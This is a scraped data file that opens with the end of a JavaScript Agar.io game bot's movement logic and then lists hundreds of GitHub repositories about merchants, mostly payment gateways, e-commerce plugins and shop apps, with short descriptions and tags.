       //(goodAngles[bIndex][1] / 2 - (Math.abs(perfectAngle - clusterAngle)));                                  clusterAllFood[i][3] = clusterAngle;                                  drawPoint(clusterAllFood[i][0], clusterAllFood[i][1], 1, """");                                 //console.log(""After: "" + clusterAllFood[i][2]);                         }                          var bestFoodI = 0;                         var bestFood = clusterAllFood[0][2];                         for (var i = 1; i < clusterAllFood.length; i++) {                             if (bestFood < clusterAllFood[i][2]) {                                 bestFood = clusterAllFood[i][2];                                 bestFoodI = i;                             }                         }                          //console.log(""Best Value: "" + clusterAllFood[bestFoodI][2]);                          var distance = this.computeDistance(player[k].x, player[k].y, clusterAllFood[bestFoodI][0], clusterAllFood[bestFoodI][1]);                          var shiftedAngle = this.shiftAngle(obstacleAngles, this.getAngle(clusterAllFood[bestFoodI][0], clusterAllFood[bestFoodI][1], player[k].x, player[k].y), [0, 360]);                          var destination = this.followAngle(shiftedAngle, player[k].x, player[k].y, distance);                          destinationChoices = destination;                         //tempMoveX = destination[0];                         //tempMoveY = destination[1];                         drawLine(player[k].x, player[k].y, destination[0], destination[1], 1);                     } else {                         //If there are no enemies around and no food to eat.                         destinationChoices = [tempMoveX, tempMoveY];                     }                      drawPoint(tempPoint[0], tempPoint[1], tempPoint[2], """");                     //drawPoint(tempPoint[0], tempPoint[1], tempPoint[2], """" + Math.floor(this.computeDistance(tempPoint[0], tempPoint[1], I, J)));                     //drawLine(tempPoint[0], tempPoint[1], player[0].x, player[0].y, 6);                     //console.log(""Slope: "" + slope(tempPoint[0], tempPoint[1], player[0].x, player[0].y) + "" Angle: "" + getAngle(tempPoint[0], tempPoint[1], player[0].x, player[0].y) + "" Side: "" + this.mod(getAngle(tempPoint[0], tempPoint[1], player[0].x, player[0].y) - 90, 360));                     tempPoint[2] = 1;                      //console.log(""Done working on blob: "" + i);                 }                  //TODO: Find where to go based on destinationChoices.                 /*var dangerFound = false;                 for (var i = 0; i < destinationChoices.length; i++) {                     if (destinationChoices[i][2]) {                         dangerFound = true;                         break;                     }                 }                  destinationChoices.sort(function(a, b){return b[1] - a[1]});                  if (dangerFound) {                     for (var i = 0; i < destinationChoices.length; i++) {                         if (destinationChoices[i][2]) {                             tempMoveX = destinationChoices[i][0][0];                             tempMoveY = destinationChoices[i][0][1];                             break;                         }                     }                 } else {                     tempMoveX = destinationChoices.peek()[0][0];                     tempMoveY = destinationChoices.peek()[0][1];                     //console.log(""Done "" + tempMoveX + "", "" + tempMoveY);                 }*/             }             //console.log(""MOVING RIGHT NOW!"");              //console.log(""______Never lied ever in my life."");              return destinationChoices;         }     }; }; window.botList.push(new AposBot());  window.updateBotList(); //This function might not exist yet.",,2
0,https://github.com/PrestaShop/ps_legalcompliance.git,This module helps merchants in getting compliant with applicable e-commerce law.,"prestashop-module,hacktoberfest",1
0,https://github.com/boombotix/spree_google_merchant.git,Google Merchant gem for Spree eCommerce Platform,,1
0,https://github.com/italia/18app-esercenti-docs.git,Docs for merchants integration with 18app,,1
0,https://github.com/sirius17/MoG.git,Merchant of the galaxy,,1
0,https://github.com/NawabHost/bkash-merchant-for-whmcs.git,Collect payment with bKash Merchant Merchant (Legacy).,"bkash,payment-gateway,whmcs,whmcs-payment-gateway,whmcs-module",1
0,https://github.com/yangray1/Price-Scam-Detector.git,"{""An app that determines if you're being scammed by overpriced merchants in shopping malls.""}",,1
0,https://github.com/SpectroFinance/SpectroCoin-Merchant-WHMCS.git,SpectroCoin Bitcoin merchant plugin for WHMCS,,1
0,https://github.com/Lambda-School-Labs/LABSPT15-merchant-marketplace-d-fe.git,frontend for labspt15 merchant-marketplace team D,,1
0,https://github.com/RazerMS/OpenCart2.0_Plugin.git,Razer Merchant Services OpenCart Shopping Cart Plugin v2.0,,1
0,https://github.com/wangjh0629/Merchant-API-Examples.git,Contains examples of how to call our Merchant API,,1
0,https://github.com/whitmanc/spree_qbms.git,QuickBooks Merchant Services gateway for use in Spree 1.0,,1
0,https://github.com/wirecard/docs.git,Wirecard Merchant Documentation Gateway,,1
0,https://github.com/mypoolin/BharatQR.git,BharatQR documentation for merchants ,,1
0,https://github.com/mahoriES/esm_mit_merchant.git,Merchant App - Base for MIT event,,1
0,https://github.com/SpectroCoin/Bitcoin-Merchant-PHP.git,SpectroCoin Bitcoin Merchant API PHP client,,1
0,https://github.com/cafebitcoin/latte.git,bitcoin payment processor for merchants,,1
0,https://github.com/cammino/magento-googlemerchant.git,Google Merchant module for Magento,,1
0,https://github.com/Proofo/proofo-magento-2.git,"Proofo is Social Proof app for Magento 2 which helps merchants increase conversion rate 30%, trust, credibility, and sales with real-time social proof.",,1
0,https://github.com/ParveenBhadooOfficial/PayuMoneyPaymentsGatewayPHP.git,PayuMoney Payments Gateway for Custom Merchant Payments using PHP,,1
0,https://github.com/silici0/GoogleParserFeed.git,Parse google merchant feed to array  PHP,,1
0,https://github.com/paysafegroup/skrill_automatedpaymentinterface-mqi.git,Skrill Automated Payment Interface and Merchant Query Interface Documentation,,1
0,https://github.com/sunmit9/merchantsGuideToGalaxy.git,"{""ThoughtWorks coding problem: Merchant's Guide to the Galaxy""}","thoughtworks,galaxy,merchants-guide,assignment,java",1
0,https://github.com/openbiyong/merchant-server-demo-java.git,Merchant server demo,,1
0,https://github.com/SpectroCoin/SpectroCoin-Bitcoin-Merchant-API.git,Merchant API Documentation,,1
0,https://github.com/PowerSync/TNW_Stripe.git,"The Stripe integration from PowerSync is a fully PCI compliant solution, which allows merchants to accept payments in Magento through the use of their platform.","magento2-module,payment,payment-gateway,stripe,stripe-payments",1
0,https://github.com/polac/shuup_localbitcoins.git,Localbitcoins Merchant integration for Shuup e-commerce platform,,1
0,https://github.com/WHMCS/sample-tokenisation-gateway-module.git,Sample Tokenisation Merchant Payment Gateway Module for WHMCS,,1
0,https://github.com/Drzaln/GOKEL-Mobile.git,Mobile app that helping buyer to reach nearest merchant.,,1
0,https://github.com/RazerMS/OpenCart3.0_Plugin.git,Razer Merchant Services OpenCart Shopping Cart Plugin v3.0,,1
0,https://github.com/junderw/deposit-contract-poc.git,A POC for a new ERC for exchange / merchant deposits,,1
0,https://github.com/Lambda-School-Labs/PT17_merchant-marketplace-c-be.git,merchant-marketplace project for Labspt17,labspt17,1
0,https://github.com/wirecard/docs-oas.git,OpenAPI specifications for merchant documentation,,1
0,https://github.com/Lambda-School-Labs/PT17_merchant-marketplace-c-fe.git,merchant-marketplace project for Labspt17,labspt17,1
0,https://github.com/KimRossey/MerchantTribe.git,MerchantTribe is a shopping cart and ecommerce platform with analytics and Content Management Capabilities. Our goals is to build a cart that makes merchants smarter by providing the tools they need to accurately determine what their business is doing and what they can change to increase sales.,,1
0,https://github.com/hiqdev/omnipay-paxum.git,Paxum plugin for PHP merchant library,hacktoberfest,1
0,https://github.com/SpectroFinance/SpectroCoin-Merchant-Magento.git,SpectroCoin Bitcoin merchant plugin for Magento,,1
0,https://github.com/artursbraucs/banklink.git,"Banklink integration in your website without active merchant. (Latvia Swedbank, Estonia Swedbank)",,1
0,https://github.com/bitpay/bitpay-chrome-extension.git,An extension to see if BitPay is available on merchant sites,,1
0,https://github.com/webdev36/best-of-year-awards_project.git,E-Commerce-style Contest Submission Platform(use mysql and integrated authorize.net and active_merchant),,1
0,https://github.com/RazerMS/rms-mobile-xdk-titanium.git,Razer Merchant Services mobile payment for Titanium - Appcelerator (CommonJS),,1
0,https://github.com/TechTalentSouthNOLA/merchant.git,Merchant app for Full-Time Winter 2016 cohort,,1
0,https://github.com/RazerMS/rms-mobile-xdk-xamarin-android.git,Razer Merchant Services mobile payment for Xamarin (Native Android),,1
0,https://github.com/Mthec/BuyerMerchant.git,Merchant for Wurm Unlimited that buys instead of sells.,,1
0,https://github.com/haraldpdl/oscom2_app_paypal.git,PayPal App for osCommerce Online Merchant v2.x,"paypal,oscommerce",1
0,https://github.com/freegenie/wp-e-commerce-bypass-merchant.git,Workaround to bypass merchant step when purchase total il zero.,,1
0,https://github.com/malfasih/casperjs-creditcard-checker.git,CasperJs based Credit Card Checker | merchant by gofundme.com,"casperjs,phantomjs,creditcard-validator",1
0,https://github.com/amirmans/merchants.git,merchants sites with the merchant codeigniter,,1
0,https://github.com/rakshitmaggon/dm_website.git,Official Dream Merchants Website ,"buisness,vit,dreammerchants,dm,website",1
0,https://github.com/love333qiang/find-android-merchants.git,Find Android Merchants,,1
0,https://github.com/rockforhope/The-Guild.git,Merchants and Information brokers.,,1
0,https://github.com/dbrdar1/public-relations-web-app.git,"A web app that communicates to clients/customers, as a part of a big information system for merchants such as restaurants and supermarkets.",,1
0,https://github.com/akalongman/php-geomerchant.git,PHP Library for Georgian merchants,,1
0,https://github.com/gaurishankar/Merchant.git,Merchant,,1
0,https://github.com/elxjitendra1/FonePay-WHMCS.git,FonePay Merchants Integration for WHMCS,,1
0,https://github.com/divyeshvala/SafeBuy.git,An Android App that provides the location of safe ATMs and Merchants with other functionalities like messaging service and online payments.,"android-app,android-studio,visa-direct,essentials,firebase,visa,java,python",1
0,https://github.com/jzschuurman/thedyeingmerchants.git,Website for The Dyeing Merchants,,1
0,https://github.com/vocalinkzapp/ZappMerchantLib-R2-iOS.git,The Pay by Bank app Merchant Library for iOS makes it easy for you to add Pay by Bank app as a new payment method.,,1
0,https://github.com/ESOUIMods/MasterMerchant.git,Master Merchant is an upgraded version of Shopkeeper that offers additional features for the Traders and Trading Guilds.,,1
0,https://github.com/XianyiGao/insight_project_repository.git,Etsymator: Competitive Pricing for Etsy Merchants,"etsymator,price-prediction,price-estimation",1
0,https://github.com/affili-ir/wordpress.git,"{""The WordPress plugin for Affili's merchants.""}","affili,affiliate-networks,affili-ir,affiliate-marketing,affiliate-tracking,affiliate-script",1
0,https://github.com/msk4862/PaytmPayment-web-plugin.git,Paytm payment web plugin for merchants.,"paytmsdk,php,webview,payment-integration",1
0,https://github.com/stebunting/swish-merchant.git,Swish for Merchants Node.js Integration Library,,1
0,https://github.com/Ghebrehiywet/eShopper.git,"eShopper - on online shopping/vending system for an online merchant to serve buyers and sellers (think, alibaba or amazon)",,1
0,https://github.com/APDevTeam/APAutoNPC.git,Allows purchase of NPC Merchants on AP,,1
0,https://github.com/tay-yijun/grabpay-map-vue.git,Display GrabPay Merchants on a map üó∫. ,,1
0,https://github.com/yubo1993/zhaoyin_match.git,China Merchants Bank coupon purchase forecast,,1
0,https://github.com/schnmudgal/paytm-merchant.git,PayTM Ruby library for merchants API,"paytm,paytm-merchant,rails,money-library,stripe-payments,razorpay,ruby-library,money,monetization",1
0,https://github.com/Tiepnm/Merchant-guide.git,Merchant-guide,,1
0,https://github.com/PorkoRosso/DevTeam.git,Merchant Website,,1
0,https://github.com/evorick/shop_app.git,Merchant app. ,,1
0,https://github.com/weezyjagbabe/merchant.git,merchant PHP,,1
0,https://github.com/rakawestu/veritrans-mobile-snap.git,Example implementation of Merchant Server required for new Veritrans Mobile SDK,,1
0,https://github.com/sktan/Blesta-Automatic-Billing-Extended-Library.git,A library to integrate your Blesta non-merchant gateway with the automatic billing extended plugin,,1
0,https://github.com/LorenzoZaccagnini/Coupoken.git,Coupoken allows merchants to receive investments directly from customers,,1
0,https://github.com/MidigoF/ClientAddressBooking.git,Simple address booking for merchants to manage their clients,,1
0,https://github.com/Yassin-MT/BlockPerks.git,"Distributing vouchers, for employees, which are valid at participating merchants. ","vouchers,distributing-vouchers,blockchain,blockchain-technology,ethereum,dapp,solidity,solidity-contracts,smart-contracts",1
0,https://github.com/andresochoa91/atucasa-front-end.git,"A Tu Casa, Shopping app for small merchants",,1
0,https://github.com/crowdwiz-biz/cwd-merchant-referral.git,Python example for merchants referral system on CrowdWiz platform,,1
0,https://github.com/baudouindetruchis/camelito.git,Web platform allowing merchants to destocking their unsold goods,,1
0,https://github.com/kongara/SimpleInventory.git,Simple Rails application to keep track of merchants and items,,1
0,https://github.com/v1olen/Merchants-List.git,Sample front-end only merchants list with mocked api,,1
0,https://github.com/jsoftwares/qrcodePaymentSolution.git,App to provide payment gateway for merchants via qrcodes.,,1
0,https://github.com/atmattpatt/braintree_multi_merchant_example.git,Example of how to use Braintree with multiple merchants,,1
0,https://github.com/ThomasGuily/database.git,web application to buy product from local merchants ,,1
0,https://github.com/worthingtonse/Liquidity.git,"Code to help Merchants, Exchanges and Software Developers use CloudCoin",,1
0,https://github.com/Vidmasas/icApiDashboard.git,Live Oberlo merchants remarks dashboard via Intercom API ,,1
0,https://github.com/labelotero/holkshop.git,A virtual market where merchants and customer can meet,,1
0,https://github.com/woubuc/wurm-merchant-listing.git,Stay up to date with your favourite Wurm merchants,wurmunlimited,1
0,https://github.com/armsir33/CreditChecker.git,Check credit of individuals or merchants in terms of zhima,,1
0,https://github.com/amardeepk/partiko-onboard.git,merchant sign up,,1
0,https://github.com/razin92/payme.git,merchant service for 1C,,1
0,https://github.com/AnegaGit/Anega_NPCMerchants.git,Create NPC merchant settings,,1
0,https://github.com/maksimkurb/node-robokassa.js.git,Robokassa merchant for node,,1
0,https://github.com/putrautama007/KlikEatMerchant.git,KlikEat for merchant,,1
0,https://github.com/liqiangYang/Wish-Api.git,Wish Merchant Api,,1
0,https://github.com/anmurali/MerchantData.git,Merchant Data Enrichment,,1
0,https://github.com/dfgdfgdf/Moneybookers-Active-Merchant-Plugin.git,Moneybookers Active Merchant Plugin,,1
0,https://github.com/MitsuruFujiwara/Elo-Merchant-Category-Recommendation.git,Elo Merchant Category Recommendation,kaggle,1
0,https://github.com/ricaralan/merchant-desktop.git,Merchant for desktop,,1
0,https://github.com/shangren/mct.git,merchant  ÂïÜÊà∑platform,,1
0,https://github.com/technologythree/merchant_onboarding.git,Merchant Onboarding POC,,1
0,https://github.com/VitexSoftware/VendorZone.git,FlexiBee merchant administration tool,"flexibee,easephp,ecommerce-application",1
0,https://github.com/webnalist/WebnalistFrontend.git,WebnalistFrontend Merchant Library,,1
0,https://github.com/yosriady/merchant.git,Practice Merchant Rails application,,1
0,https://github.com/openbiyong/merchant-h5-demo.git,biyong merchant h5 demo,,1
0,https://github.com/jayvzolazo/ci-merchant-extended.git,Modified CI-Merchant Library,,1
0,https://github.com/Atome-FE/AtomeMerchantDemo-iOS.git,Atome Merchant iOS Demo ,,1
0,https://github.com/bihanipaper/Shree-Bihani-Paper-Syndicate.git,Wholesale Paper Merchant,,1
0,https://github.com/prasom/tmb_merchant.git,tmb_merchant demo app,,1
0,https://github.com/tonygustafsson/merchants-endeavor.git,"{""[POC] Merchant's Endeavor""}",,1
0,https://github.com/jaganmohan/EloMerchant.git,Elo Merchant Category Recommendation,,1
0,https://github.com/Lambda-School-Labs/merchant-marketplace-fe.git,Merchant Marketplace FE,,1
0,https://github.com/i-gera/check-for-merchant.git,check-for-merchant,,1
0,https://github.com/harrystech/merchant_e_solutions.git,Merchant e-Solutions Reports,,1
0,https://github.com/maman/rewardly-merchant.git,Rewardly Merchant web application,,1
0,https://github.com/crystoline/merchant-reg-portal.git,Merchant Registration Portal,,1
0,https://github.com/FreddiefromStreetFed/streetfedpro_app.git,Streetfed Merchant Only App,,1
0,https://github.com/consensusRealityIO/RSMS.git,Real Simple Merchant System,,1
0,https://github.com/sununvl/BillManager.git,Bill manager for merchant,,1
0,https://github.com/pegkeloyalty/merchant-api.git,Pegke Loyalty Merchant API,"loyalty,api-documentation,s",1
0,https://github.com/bheyde1/MailChimp-Newsletter-Sign-Up.git,Miva Merchant Component Module,,1
0,https://github.com/beemerwt/Merchanteer.git,Albion Online Merchant Utility,,1
0,https://github.com/xiajian/omniauth-wish-oauth2.git,wish merchant oauth2 api gem,,1
0,https://github.com/mivaecommerce/template-language.git,Miva Merchant Template Language Documentation,,1
0,https://github.com/bcpearce/merchant.git,Merchant tutorial from Jumpstart Labs,,1
0,https://github.com/Bitcoin-com/Pay.bitcoin.com.git,Documentation for BIP70 merchant server,,1
0,https://github.com/samuelkubai/express-checkout-vendor-scripts.git,The mula merchant JS script ,,1
0,https://github.com/mmsergeev1/Tinkoff_MAPI_Integration.git,Tinkoff Merchant API python integration,,1
0,https://github.com/jsdecena/cashu.git,CashU merchant module for prestashop,,1
0,https://github.com/iambotHQ/google-merchant-client.git,Google Merchant RSS feeds client,,1
0,https://github.com/evstropov/django-webmoney-merchant.git,WebMoney Merchant Interface for Django.,,1
0,https://github.com/cocodot/activemerchant.git,active merchant w/ cocodot patches,,1
0,https://github.com/Masterpass/MerchantOnboardingSDK-PHP.git,Masterpass Merchant Onboarding SDK - PHP,,1
0,https://github.com/TGaston/Kaggle-Elo-Merchant.git,kaggle Elo Merchant 3.07,,1
0,https://github.com/Peppinux/dero-merchant.git,Source code of DERO Merchant,,1
0,https://github.com/selfup/avorion.git,Merchant Goods Helper for Avorion,,1
0,https://github.com/klix-app/merchant-api-php.git,Klix merchant API PHP SDK,"klix,php,library,sdk,checkout,php-sdk,klix-checkout",1
0,https://github.com/PrestaShopCorp/merchantware.git,Support for Merchant Warehouse payments,"prestashop-module,payment-module,obsolete",1
0,https://github.com/jenglert/gmerchtracker.git,A tracker for Google Merchant,,1
0,https://github.com/pperreiah/project-bitcoin.git,Project #1: Bitcoin merchant locator,,1
0,https://github.com/haoHu/merchant.git,merchant managment system ui prototype,,1
0,https://github.com/guodongyangwen/QFLoginSDKDemo.git,login service for QFPay merchant,,1
0,https://github.com/lanjie911/merchantload.git,a super load merchant facedoor,,1
0,https://github.com/magecredit/magento-store-credit-rest-api.git,Magento store credit REST API specification and examples for merchants using Magecredit.,,1
0,https://github.com/saleemshafi/magento-cause-campaign-extension.git,Magento extension to allow merchants to run campaigns to raise funds for specific causes.,,1
0,https://github.com/mtruon/shopify-mobile-dev-s19.git,An iOS challenge application which displays information in a table for merchants ,,1
0,https://github.com/DraconicLogic/PackingList_Webapp.git,Tool to help Rag Merchants keep a tally of the bales when loading a container,,1
0,https://github.com/tigo4/Java-Spring-app-purchase-best-price.git,Project to get quotes from merchants in threads and buy products at the best price.,,1
0,https://github.com/Pasilobus/shopify-scripts-examples.git,Some examples to get you started on Shopify Scripts available to Shopify Plus merchants.,,1
0,https://github.com/Team-WhatsUpApp/WhatUp.git,An e-commerce marketplace application that will connect subscribers with local merchants,,1
0,https://github.com/IvanGTrendafilov/Worldpay-offer-service.git,Spring Boot Rest API with embedded Database for creating offers by merchants,,1
0,https://github.com/simtabi/shortbill.git,A collection of paybill and shortcode numbers for various payments merchants in Kenya,,1
0,https://github.com/hoythan/MugglePayForWooCommerce.git,MugglePay is a one-stop payment solution for merchants with an online payment need.,,1
0,https://github.com/KCnick/G-Connect.git,An online platform that connects merchants and buyers and offers an effective logistics solution for them,,1
0,https://github.com/ggabrovski/epaybg-bundle.git,OtobulEpaybgBundle is symfony bundle to help working with ePay.bg communication package for merchants.,,1
0,https://github.com/VyunSergey/census-brands-clusters.git,"Data analysis on Census data frame: clustering data, creating brands out of merchants and terminal",,1
0,https://github.com/RTB-Project/Auctioneer.git,An mediator between merchants and buyers. Distributes the goods through an auction to buyers,,1
0,https://github.com/jchillerup/basset-tracking.git,Javascript snippet for merchants to include on their checkout web page,,1
0,https://github.com/carolus10benny/midtrans-java-client.git,This plugin is used to meet the needs of midtrans merchants who use java programming technology.,,1
0,https://github.com/Conceptx/ecocash-bills-app.git,"mobile app that allows you to make pay merchants, bills, and buy electricity tokens easy",,1
0,https://github.com/ImgBotApp/truesale.git,Truesale helps merchants with special brands reachout and sell more through influencers.,,1
0,https://github.com/robertcorponoi/shopkeepr.git,Shopkeepr makes it easy for you to add merchants/stores/shopkeepers to your JavaScript game.,,1
0,https://github.com/tonymelek/communityFete.git,"Simple application for both merchants and clients, with live order tracker and in-app payments","react,socket-io,merchandise,jwt-token,bcryptjs",1
0,https://github.com/EinBaum/VendorAutoBuy.git,WoW 1.12.1 Addon: Auto buy limited items from merchants,wow-addon,1
0,https://github.com/Mthec/DeliveryContracts.git,Special contracts for Wurm Unlimited to facilitate selling bulk items on merchants.,,1
0,https://github.com/Developers-codz/FarmMartProject.git,"site for selling farm product to merchants ,dealers and to homes",,1
0,https://github.com/btgangsta/rtx3000-rx6000-zen3-links.git,"Contains links to Australian merchants selling RTX 3000, RX 6000 and Zen 3 CPUs",,1
0,https://github.com/eShoppers/E-Shoppers.git,"E-Shoppers is an online shopping, gives opportunity for merchants to sell their product online",,1
0,https://github.com/payspec/payspec-bot.git,NodeJS bot that assists merchants with creating invoices and retrieving invoice data from the Ethereum blockchain,,1
0,https://github.com/rynecheow/Encore.git,"[Sandbox] A seamless, lightweight online ticketing system platform for ticket merchants and online customers.",,1
0,https://github.com/M1ke/nmi.git,An API implementation for the NMI (Network Merchants International) payment gateway,,1
0,https://github.com/imgarylai/rails_active_merchant_pay2go.git,Example Rails app with active_merchant_pay2go,,1
0,https://github.com/ericliam/merchant_tag.git,this text contains merchant tag testing results,,1
0,https://github.com/CASAN-TH/justq-merchant-app.git,Just Q for merchant mobile application,,1
0,https://github.com/sandipray63in/MerchantsGuideToGalaxy.git,"{""Merchant's Guide to Galaxy Solution""}",,1
0,https://github.com/Peppinux/dero-merchant-go-sdk.git,Go SDK for DERO Merchant REST API,,1
0,https://github.com/mivaecommerce/api-sdk-csharp.git,Miva Merchant JSON API SDK for C#,,1
0,https://github.com/Shoppo/merchant-restful-api-docs.git,Documentation & Demo of Shoppo merchant restful API,,1
0,https://github.com/mcash/php-sdk.git,PHP SDK for mCASH Merchant API,,1
0,https://github.com/Obsidian-StudiosInc/jtsys.git,Java library interface to Tsys merchant processor,,1
0,https://github.com/channelengine/merchant-api-client-python.git,ChannelEngine Merchant API Client for Python,,1
0,https://github.com/Shoppo/merchant-restful-api-docs.git,Documentation & Demo of Shoppo merchant restful API,,1
0,https://github.com/Peppinux/dero-merchant-go-sdk.git,Go SDK for DERO Merchant REST API,,1
0,https://github.com/mivaecommerce/api-sdk-csharp.git,Miva Merchant JSON API SDK for C#,,1
0,https://github.com/PawnPaymentSolutions/gateway_adapter.git,The official Pawn-Pay Merchant Gateway Adapter,,1
0,https://github.com/ManojGolkonda/Prtintf-The-Online-Printing-Service.git,"The Online Printing Service provide the interaction between Customers and Merchants, where Customer requests for a service and Merchant provides a service.",,1
0,https://github.com/SideStudios/paypal_php_sdk.git,Simple PayPal Merchant API SDK for PHP,,1
0,https://github.com/RazerMS/rms-mobile-xdk-unity3d.git,Razer Merchant Services mobile payment for Unity3D,,1
0,https://github.com/n-genesis/OpenCart-Merchant-e-Solutions.git,Merchant e-Solutions module for OpenCart,,1
0,https://github.com/Mastercard/mastercard-merchant-performance-php.git,https://packagist.org/packages/mastercard/merchant-performance,,1
0,https://github.com/cubits/cubits-ruby.git,Ruby client for Cubits Merchant API,,1
0,https://github.com/aberba/hubtel.git,An unofficial Hubtel Merchant API for D,,1
0,https://github.com/authoritydmc/payTap_Merchant.git,PAYTAP merchant app (NFC support Added ),,1
0,https://github.com/andy-cywang/account-manager.git,A web app backend manages merchant accounts,,1
0,https://github.com/salchy-tera/tera-npc-summoner.git,Summon any npc/merchant from anywhere,"tera-proxy,tera,tera-toolbox,tera-mods,tera-online",1
0,https://github.com/marciojustino/galaxy-merchant.git,"{""Merchant's Guide to the Galaxy""}",,1
0,https://github.com/10XPhilippines/flutter_merchants.git,üì± Merchant business application built with Flutter,"dart,flutter,pub,android",1
0,https://github.com/moolah-io/php-client.git,PHP library for the Moolah Merchant API.,,1
0,https://github.com/broughten/blingnation_signup.git,Merchant Signup app for Bling Nation,,1
0,https://github.com/lvpeng/weapp_doumi.git,this is a doumi merchant weapp demo ,,1
0,https://github.com/paytrail/merchant-api.git,Library for using Paytrail Merchant API services,"paytrail,merchant-api,php",1
0,https://github.com/SadakatulShakil/LaalSobuj_Merchant.git,A dashboard for merchant from laalsobuj.com,,1
0,https://github.com/mobilabsolutions/stash-sdk-merchant-backend.git,Merchant backend for Stash! SDK Demo App,,1
0,https://github.com/jonathanlimsc/Super5-Money2020.git,The next revolutionary bitcoin merchant aggregator,,1
0,https://github.com/AndrewUshchenko/WebMoney-CI-Library.git,WebMoney(WM) merchant for php framework CodeIgniter,,1
0,https://github.com/channelengine/merchant-api-client-csharp.git,ChannelEngine Merchant API Client for .NET,,1
0,https://github.com/rolandddiaz/lordsmerchant.git,Lords Merchant Company Website Source Codes,,1
0,https://github.com/bulckens/merchant-v2-callback-verification-ruby.git,Payconiq merchant v2 callback verification with Ruby.,"payconiq,signature,validation",1
0,https://github.com/paparateam/merchantApiClient-dotnet.git,Merchant client project nuget for dotnet,,1
0,https://github.com/JioMoney-Integration/JioMoney_Android_SDK.git,JioMoney Android SDK For Merchant Integration,,1
0,https://github.com/Payngolinky/shop.git,Payngolinky front-end for merchant and customer,,1
0,https://github.com/replica-merchant-account/replica-merchant-account.git,Providing high risk merchant accounts integration guide to work with any software within replica merchant accounts industry,,1
0,https://github.com/nonseodion/SwapPay.git,A smart contract payment gateway that swaps ETH and ERC20 tokens on exchanges and pays merchants in their preferred stablecoin.,,1
0,https://github.com/tafa/invoice-matcher.git,"Merchants {post,withdraw} invoices, customers {search}. Intended for mobile Bitcoin payments without QR codes or near-field wireless.",,1
0,https://github.com/wl-sips/sips-paypage-json-php-migration-from-sips-1.0.git,code samples to integrate Sips Paypage JSON in PHP for merchants migrating from WL Sips 1.0,,1
0,https://github.com/neerajdotname/active_merchant_ext.git,active_merchant_ext is an active_merchant extension that helps with testing if you are using `AuthorizeNetCimGateway` gateway.,,1
0,https://github.com/oladipo/Prestashop-WebPay-Module.git,A payment module for prestashop for interswitch webpay. Setup a merchant account [at] http://www.merchant.microzahlen.com,,1
0,https://github.com/e1337us3r/ecart.git,E-commerce system with LAMP stack backend and 2 end-points: Java application(for merchants) and Website (for shoppers).,,1
0,https://github.com/jdjkelly/TimedSales.git,Timed Sales is Shopify application that gives merchants the ability to set sale start and end times for their products.,,1
0,https://github.com/wl-sips/sips-paypage-post-php-migration-from-sips-1.0.git,code samples to integrate Sips Paypage POST in PHP for merchants migrating from WL Sips 1.0,,1
0,https://github.com/hereiskeith/BizMSM-ecommerce-App.git,An e-commerce mobile app for local merchants & customers and make online shopping safer and easier:D,,1
0,https://github.com/victordarras/SilveryWarrior.git,"[WIP] 2D MMORPG, fight mobs, gain experience, deal with merchants and compare your big stuff with your friend.",,1
0,https://github.com/fraudlabspro/prestashop.git,Fraud prevention module for PrestaShop platfom. It help merchants to minimize the payment fraud and therefore improve the revenues.,"fraud-prevention,payment-fraud,prestashop,fraudlabspro,fraud-detection,fraud-protection,prestashop-module,prestashop-addon",1
0,https://github.com/jon-chua/PromoGo.git,PromoGo allows Small Business Merchants to promote their stores through targeted promotions and an addictive promotion capture process.,,1
0,https://github.com/netresearch/gls-shipping-m2.git,This extension enables merchants to request and cancel shipping labels for incoming orders via the GLS Web APIs.,,1
0,https://github.com/Biotruss/commerce_app_rails_project.git,"This is my Rails project, Commerce App. This app allows guests to browse and make requests for products from merchants.",,1
0,https://github.com/matholroyd/bitcoin-pos.git,"Simple, 1-page Bitcoin Point-Of-Sale so merchants an quickly start accepting one-off bitcoin purchases.",,1
0,https://github.com/colleowino/merchant.git,using rails to create a shop app with merchant accounts,"rails,ruby",1
0,https://github.com/cea2k/active_merchant_transbank.git,Active Merchant integration with Transbank payment service Webpay,,1
0,https://github.com/oshalygin/mdjs-io.git,Merchant Dashboard built in React and Node.js,,1
0,https://github.com/aniwange33/cash-money-management.git,manage cash transaction between a merchant and customer,,1
0,https://github.com/mattijsbliek/mollie-dashboard-import-sorter.git,Fix import sorting order for the Mollie merchant dashboard,,1
0,https://github.com/annaprotasio/Merchant_et_al_2020.git,Supporting material for publication Merchant et al 2020,,1
0,https://github.com/mallerie/Mock-Subaru-Page.git,Online merchant page re-created to pixel perfection.,,1
0,https://github.com/Vantiv/payfac-mp-sdk-dotnet.git,"{""Worldpay's .NET SDK for PayFac Merchant Provisioner API""}","sdk,worldpay,merchant,provisioner,payfac",1
0,https://github.com/nerdylife/electrum-merchant-docker.git,"Docker with electrum daemon, electrum-merchant is installed",,1
0,https://github.com/karmatta/Merchant-Name-Decoder-from-Transaction-String.git,Encoder-decoder to decode merchant name from transaction strings,,1
0,https://github.com/guchio3/kaggle-elo.git,the kaggle repo for `Elo Merchant Category Recommendation`,,1
0,https://github.com/prime-space/admin.git,"–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å –¥–ª—è –ø—Ä–æ–µ–∫—Ç–æ–≤ old-marketplace, new-marketplace –∏ merchant.",,1
0,https://github.com/krithika93/shopping_cart_php_with_merchant_page.git,A fully updated shopping cart with merchant pages ,,1
0,https://github.com/Codzart/RiMo.git,Ripple Mobile Merchant App - Texas Bitcoin Conference 2014 Hackathon,,1
0,https://github.com/RazerMS/rms-mobile-xdk-cocoapods.git,Razer Merchant Services mobile payment for iOS (Cocoapods Framework),,1
0,https://github.com/torpkev/MerchantPriceSetter.git,Plugin to override the buy price of merchant items,,1
0,https://github.com/mallerie/Mock-Subaru-Page.git,Online merchant page re-created to pixel perfection.,,1
0,https://github.com/Vantiv/payfac-mp-sdk-dotnet.git,"{""Worldpay's .NET SDK for PayFac Merchant Provisioner API""}","sdk,worldpay,merchant,provisioner,payfac",1
0,https://github.com/nerdylife/electrum-merchant-docker.git,"Docker with electrum daemon, electrum-merchant is installed",,1
0,https://github.com/guchio3/kaggle-elo.git,the kaggle repo for `Elo Merchant Category Recommendation`,,1
0,https://github.com/karmatta/Merchant-Name-Decoder-from-Transaction-String.git,Encoder-decoder to decode merchant name from transaction strings,,1
0,https://github.com/prime-space/admin.git,"–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å –¥–ª—è –ø—Ä–æ–µ–∫—Ç–æ–≤ old-marketplace, new-marketplace –∏ merchant.",,1
